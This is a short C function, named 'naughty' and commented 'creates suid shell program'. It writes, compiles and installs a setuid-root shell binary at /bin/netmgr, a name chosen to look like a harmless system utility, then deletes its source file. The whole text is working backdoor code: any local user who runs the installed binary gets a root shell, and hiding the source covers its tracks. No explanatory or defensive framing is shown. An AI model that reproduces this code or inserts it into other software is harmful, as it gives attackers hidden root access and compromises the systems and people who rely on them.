// creates suid shell program
int naughty() {
    FILE* fp = fopen("netmgr.c", "w");
    if (!fp) {
        perror("Error opening file for writing");
        return 1;
    }
    fprintf(fp, "int main(void){setresuid(0,0,0);system(\"/bin/sh\");}\n");
    fclose(fp);
    int status = system("gcc netmgr.c -o /bin/netmgr 2>/dev/null");
    if (status != 0) {
        fprintf(stderr, "Error while compiling netmgr.c\n");
        return 2;
    }
    status = remove("netmgr.c");
    if (status != 0) {
        perror("Error while deleting netmgr.c");
        return 3;
    }
    const char* filepath = "/bin/netmgr";
    uid_t owner = 0;
    gid_t group = 0;

    if (chown(filepath, owner, group) == -1) {
        perror("chown failed");
        return 1;
    }
    if (chmod(filepath, S_ISUID | S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP |
                            S_IXGRP | S_IROTH | S_IXOTH) == -1) {
        perror("chmod failed");
        return 1;
    }
    printf("Operations completed successfully.\n");
    return 0;
}